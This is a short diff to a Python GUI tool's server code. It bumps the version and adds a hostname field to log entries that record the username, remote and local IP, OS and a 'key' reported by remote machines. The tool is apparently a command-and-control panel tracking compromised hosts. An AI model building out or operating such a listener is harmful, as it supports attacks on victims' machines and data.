@@ -39,7 +39,7 @@ but can easily be coded into it as a nice feature.
 __author__ = "Leon Voerman"
 __copyright__ = "Copyright 2019, Incoming Security"
 __license__ = "GPLv3"
-__version__ = "1.0.0"
+__version__ = "1.2.1"
 __maintainer__ = "Leon Voerman"
 __email__ = "I don't need spam, open an issue on GitHub, thank you :)"
 __status__ = "Production"
@@ -839,16 +839,18 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 system = data.split('$')[1]
                                 key = data.split('$')[2].strip()[2:].strip()[:-1]
                                 user = data.split('$')[3]
+                                hostname = data.split('$')[4]
 
                                 result = '''
 [Occured]    -> %s %s
 [Username]   -> %s
 [Remote IP]  -> %s
 [Local IP]   -> %s
-[Platform]   -> %s
+[OS]         -> %s
+[Hostname]   -> %s
 [Key]        -> %s
 
-''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, key)
+''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, hostname, key)
 
                                 self.serv.options['log'].insert(END, result, 'yellow')
                                 self.serv.options['log'].see(END)
